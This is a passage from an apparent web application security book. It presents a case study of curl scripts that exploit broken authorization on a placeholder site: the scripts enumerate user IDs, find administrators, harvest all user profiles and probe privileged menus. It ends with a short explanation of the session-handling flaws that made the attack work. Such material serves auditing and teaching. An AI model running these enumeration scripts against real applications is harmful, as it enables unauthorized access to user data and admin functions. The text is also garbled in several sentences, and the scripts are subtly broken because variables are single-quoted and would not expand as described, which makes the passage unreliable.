## Final Notes

Sometimes it is difficult to craft the right request or even know what fields are. The authors have used a technique called differential analysis that has proven quite successful. Although this sounds complicated, the technique is very simple. You basically need to have two or more accounts. You crawl the Web site with each account and note the differences, hence the differential analysis. Now, you have two accounts and can note where the cookies and other fields differ. For example, some cookie values or other information will reflect differences in profiles or customized settings. Other values, ID numbers for one, might be close together. Still other values might differ based on the permissions of each user.

## CASE STUDY: USING CURL TO MAP PERMISSIONS

Curl is a fantastic tool for automating tests. For example, suppose you are auditing an application that does out user IDs sequentially. You have identified the session tokens for a user to view his profile information: uid (a numeric user ID) and sessid (the session ID). The URL request is a GET command that passes these arguments: menu=4 (the number that indicates the profile menu), userID=uid (the user ID is passed in the cookie and in the URL), profile-uid (the profile to view, assumed to be the user's), and r=87bace2 (a random number assigned to the session when the user first logs in). So, the request would look like:

```
GET /secure/display.php?menu=4&userID=24601&profile=24601&r=87bace2
Cookie: uid=24601; sessid=99834948209
```

We have determined that it is possible to change the profile and userID parameters in the URL to view someone else's profile (including the ability to change the e-mail address to which password resets are sent). Now, we know that the user IDs are generated sequentially, but we don't know which user IDs belong to the application administrators. In other words, we need to determine which IDs can view an arbitrary profile. A little bit of manual testing reveals that if we use an incorrect combination of profile and userID values, the application returns "You are not authorized to view this page" and a successful request "Membership profile for"; return a 200 HTTP code. We will automate this check with two curl scripts.

The first script is used to determine whether other users can view our profile. If another user can view our profile, then it is assumed to belong to an administrator. The script tests the first 100000 user IDs:

```bash
#!/bin/sh
userID=1
while [ $userID -le 100000 ]; do
  echo -e "userID=$userID\n" >> results.txt
  curl -v -G \
  -H 'Cookie: uid=$userID; sessid=99834948209' \
  -d 'menu=4' \
  -d 'userID=$userID' \
  -d 'profile=24601' \
  -d 'r=87bace2' \
  --url https://www.victim.com/ >> results.txt
  echo -e "********\n" >> results.txt
  userID=$((userID + 1))
done
```

After executing the scripts, we will still need to manually search the results.txt for successes, which is as simple as running a grep for "Membership profile for" against the file. In this scenario, user IDs 1, 293, and we found three administrators were able to view our profile.

Next, we'll use the second script to enumerate all of the active user IDs by sequentially checking profiles. This time we use the UserID value and increment the profile value. We'll use the User ID of 293 for the administrator:

```bash
#!/bin/sh
PROFILE=1
while [ $PROFILE -le 100000 ]; do
  echo -e "PROFILE=$PROFILE\n" >> results.txt
  curl -v -G \
  -H 'Cookie: uid=293; sessid=99834948209' \
  -d 'menu=4' \
  -d 'userid=293' \
  -d 'profile=$PROFILE' \
  -d 'r=87bace2' \
  --url https://www.victim.com/ >> results.txt
  echo -e "********\n" >> results.txt
  PROFILE=$(expr $PROFILE + 1)
done
```

Once this script has finished running, we have enumerated the profile information for every active user in the application. After taking another look at the URL's parameters (menu=4&userID=24601&profile=24601&r=87bace2), a third attack comes to mind. So far we've accessed the application as a low-privilege user. That is, our ID number, 24601, has access to a limited number of options. On the other hand, it is likely that the administrator, user ID number 293, has more menu options available. We can't log in as the administrator because we don't have user's password, but we've only been presented with options of the application intended for low-privilege users.

The third attack is simple. We'll modify the curl script and enumerate the menu values for the application. Since we don' know what the values will be, we'll create the script so it accepts a menu number from the command line and prints the server's response to the screen:

```bash
#!/bin/sh
# guess menu options with curl: guess.sh
curl -v -G \
  -H 'Cookie: uid=293; sessid=99834948209' \
  -d 'menu=$1' \
  -d 'userID=293' \
  -d 'r=87bace2' \
  --url https://www.victim.com/
```

Here's how we would execute the script:

```
$ ./guess.sh 4
$ ./guess.sh 7
$ ./guess.sh 8
$ ./guess.sh 32
```

Table 6-3 shows the result of the manual tests. We skipped a few numbers for each power of two (4, 8, 16, 32) returns a different menu. This makes sense in a way. The application could be using an 8-bit bitmask to pull a particular menu. For example, the menu appears in binary as 00000100 and the delete user appears as 01000000. A bitmask is merely one method of referencing data. There are two points to this example. One, examine all of an application's parameters in order to test the full measure of its functionality. Two, look for trends within the application. A trend being a naming convention or a progression as we've shown here.

There's a final attack that we haven't tried yet—enumerating session management is described in detail in Chapter 7, but we should mention that the previous scripts can be easily modified to enumerate valid sessions.

Before we finish talking about curl, let's explain why this attack worked:

- Poor session handling The attack triggered the session cookie value and the r value in the URL; the application did not correlate either with the user ID number. In other words, once we were authenticated to the application, all we needed to remain authenticated with the session and valid. The uid and userID values were used to check authorization, whether or not the account could access a particular profile. By not tying the authorization tokens (uid, userID) to the authentication tokens (sess, r), we were able to impersonate other users and gain privileged access. If the application had the uid value matched the session value from the session was first established, then the application would have stopped the attack.

- No forced session timeout The application did not expire the session token (sessid) after six hours. This is a tricky point to bring up, because technically the session was active the entire time as intended. However, applications can still enforce hard limits on a session, such as one hour, and request the user to reauthenticate. This would not have stopped the attack, but it would have been mitigated.
